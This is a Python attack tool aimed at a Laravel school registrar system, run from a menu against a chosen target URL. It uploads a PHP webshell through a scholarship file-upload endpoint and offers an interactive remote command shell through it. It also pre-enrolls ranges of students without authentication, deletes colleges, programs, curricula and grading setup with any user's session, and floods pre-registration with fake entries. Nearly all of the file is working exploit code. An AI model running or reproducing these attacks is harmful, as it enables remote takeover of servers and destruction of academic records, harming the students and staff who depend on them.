import sys
import os
import json
import requests

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

BANNER = rf"""
{RED}   ╔═══════════════════════════════════════════════╗
   ║  {BOLD}PAYLOAD{RESET}{RED}  — File Upload RCE + Registrar Ops  ║
   ║  ST-01 | R-03/R-04/R-06 | Upload → Shell    ║
   ╚═══════════════════════════════════════════════╝{RESET}
"""

def menu():
    return f"""
  {CYAN}[1]{RESET} Upload PHP shell via scholarship       {DIM}(ST-01){RESET}
  {CYAN}[2]{RESET} Execute cmd on uploaded shell           {DIM}(ST-01){RESET}
  {CYAN}[3]{RESET} Unauthenticated enrollment manipulation {DIM}(R-03){RESET}
  {CYAN}[4]{RESET} Delete academic configuration (any user){DIM}(R-04){RESET}
  {CYAN}[5]{RESET} Pre-registration spam                   {DIM}(R-06){RESET}
  {DIM}[0]{RESET} Exit
"""

# ── MODE 1: Upload PHP shell ──────────────────────────────────────────────────
def mode_upload_shell(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session (any user): ").strip()
    
    print(f"  {DIM}[*] Generating PHP webshell...{RESET}")
    shell_code = '<?php if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"]." 2>&1")."</pre>";}?>'
    
    # Write temp shell file
    shell_file = "shell_upload.php"
    with open(shell_file, "w") as f:
        f.write(shell_code)
    
    cookies = {"laravel_session": session}
    
    print(f"  {DIM}[*] Uploading to /uploadrequirement...{RESET}")
    with open(shell_file, "rb") as f:
        r = requests.post(f"{base_url}/uploadrequirement",
                          files={"file": ("shell.php", f, "application/octet-stream")},
                          cookies=cookies, timeout=15)
    
    os.remove(shell_file)
    
    if r.status_code == 200:
        # Try to extract filename from response
        try:
            data = r.json()
            filename = data.get("filename", data.get("path", ""))
        except:
            filename = ""
        
        if filename:
            print(f"  {GREEN}[+]{RESET} Shell uploaded: {BOLD}{filename}{RESET}")
            shell_url = f"{base_url}/scholarship/{filename}"
        else:
            print(f"  {GREEN}[+]{RESET} Upload returned HTTP 200")
            print(f"  {DIM}[*] Response: {r.text[:200]}{RESET}")
            filename = input(f"  {CYAN}[?]{RESET} Enter stored filename (from response): ").strip()
            shell_url = f"{base_url}/scholarship/{filename}"
        
        # Verify
        print(f"  {DIM}[*] Verifying shell at {shell_url}?cmd=echo+pwned{RESET}")
        try:
            v = requests.get(f"{shell_url}", params={"cmd": "echo pwned"}, timeout=5)
            if "pwned" in v.text:
                print(f"  {GREEN}[+]{RESET} {BOLD}SHELL IS LIVE!{RESET}")
                print(f"  {GREEN}[+]{RESET} URL: {shell_url}?cmd=<command>")
            else:
                print(f"  {YELLOW}[?]{RESET} Shell may need different path — HTTP {v.status_code}")
        except:
            print(f"  {YELLOW}[?]{RESET} Could not verify — try manually")
    else:
        print(f"  {RED}[-]{RESET} Upload failed — HTTP {r.status_code}: {r.text[:200]}")

# ── MODE 2: Execute command on uploaded shell ─────────────────────────────────
def mode_exec_shell(base_url):
    shell_url = input(f"  {CYAN}[?]{RESET} Full shell URL (or just filename): ").strip()
    if not shell_url.startswith("http"):
        shell_url = f"{base_url}/scholarship/{shell_url}"
    
    print(f"  {DIM}[*] Shell: {shell_url}{RESET}")
    print(f"  {DIM}[*] Type 'exit' to quit{RESET}\n")
    
    while True:
        cmd = input(f"  {RED}┌─[shell]{RESET}\n  {RED}└──╼ ${RESET} ").strip()
        if cmd.lower() in ("exit", "quit", "q"):
            break
        try:
            r = requests.get(shell_url, params={"cmd": cmd}, timeout=10)
            # Strip HTML tags
            import re
            output = re.sub(r'<[^>]+>', '', r.text).strip()
            if output:
                print(f"  {output}")
            else:
                print(f"  {DIM}(empty output){RESET}")
        except Exception as e:
            print(f"  {RED}[!]{RESET} {e}")

# ── MODE 3: Enrollment manipulation ──────────────────────────────────────────
def mode_enrollment(base_url):
    action = input(f"  {CYAN}[?]{RESET} Action (pre-enroll / early-enroll): ").strip().lower() or "pre-enroll"
    
    if "pre" in action:
        stud_ids = input(f"  {CYAN}[?]{RESET} Student ID range (e.g. 1-100): ").strip() or "1-50"
        start, end = map(int, stud_ids.split("-"))
        
        count = 0
        from tqdm import tqdm
        for sid in tqdm(range(start, end + 1), desc="Pre-enrolling", ncols=80):
            r = requests.get(f"{base_url}/pre/enrollment/submit",
                             params={"studid": sid}, timeout=5)
            try:
                if r.json()[0].get("status") == 1:
                    count += 1
            except:
                pass
        print(f"  {GREEN}[+]{RESET} Pre-enrolled {count} students (NO AUTH)")
    else:
        stud_id = input(f"  {CYAN}[?]{RESET} Student ID: ").strip() or "1"
        syid    = input(f"  {CYAN}[?]{RESET} SY ID: ").strip() or "1"
        semid   = input(f"  {CYAN}[?]{RESET} Semester ID: ").strip() or "1"
        levelid = input(f"  {CYAN}[?]{RESET} Level ID: ").strip() or "7"
        
        r = requests.get(f"{base_url}/early/enrollment/submit",
                         params={"studid": stud_id, "syid": syid, "semid": semid, "levelid": levelid},
                         timeout=10)
        print(f"  {GREEN}[+]{RESET} Early enrollment submitted — HTTP {r.status_code}")

# ── MODE 4: Delete academic config ───────────────────────────────────────────
def mode_delete_config(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session (any user): ").strip()
    cookies = {"laravel_session": session}
    
    print(f"  {DIM}Resources: colleges, programs, curricula, grading-setup{RESET}")
    resource = input(f"  {CYAN}[?]{RESET} Resource type: ").strip() or "colleges"
    res_id   = input(f"  {CYAN}[?]{RESET} Resource ID to delete: ").strip() or "1"
    
    if resource == "grading-setup":
        r = requests.post(f"{base_url}/registrarv2/grading-setup/delete",
                          json={"id": int(res_id)}, cookies=cookies, timeout=10)
    else:
        r = requests.delete(
            f"{base_url}/registrarv2/setup/higher-education/{resource}/{res_id}",
            cookies=cookies, timeout=10)
    
    print(f"  {GREEN}[+]{RESET} Deleted {resource} ID={res_id} — HTTP {r.status_code}")
    print(f"  {YELLOW}[!]{RESET} Academic configuration permanently damaged")

# ── MODE 5: Pre-registration spam ────────────────────────────────────────────
def mode_prereg_spam(base_url):
    count = int(input(f"  {CYAN}[?]{RESET} Number of fake registrations: ").strip() or "50")
    
    import re, random, string
    s = requests.Session()
    
    # Get CSRF token
    r = s.get(f"{base_url}/prereg/newstudent", timeout=10)
    token_match = re.search(r'name="_token"\s*value="([^"]+)"', r.text)
    token = token_match.group(1) if token_match else ""
    
    if not token:
        print(f"  {RED}[-]{RESET} Could not find CSRF token")
        return
    
    from tqdm import tqdm
    for i in tqdm(range(count), desc="Spamming", ncols=80):
        fname = "Test" + "".join(random.choices(string.digits, k=4))
        s.post(f"{base_url}/storeprereg/newstudent", data={
            "_token": token,
            "firstname": fname,
            "lastname": "SpamEntry",
            "gender": random.choice(["M", "F"]),
            "levelid": "1",
            "gradeSection": "1"
        }, timeout=5)
    
    print(f"  {GREEN}[+]{RESET} Submitted {count} fake pre-registrations")

# ── MAIN ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(BANNER)
    BASE_URL = input(f"  {CYAN}[?]{RESET} Target URL: ").strip().rstrip("/")
    
    while True:
        print(menu())
        choice = input(f"  {DIM}┌─[payload]─[~]{RESET}\n  {DIM}└──╼ ${RESET} ").strip()
        
        if choice == "0": break
        elif choice == "1": mode_upload_shell(BASE_URL)
        elif choice == "2": mode_exec_shell(BASE_URL)
        elif choice == "3": mode_enrollment(BASE_URL)
        elif choice == "4": mode_delete_config(BASE_URL)
        elif choice == "5": mode_prereg_spam(BASE_URL)
        else: print(f"  {RED}[!]{RESET} Invalid choice")
    
    print(f"\n  {DIM}[*] PAYLOAD session ended{RESET}\n")
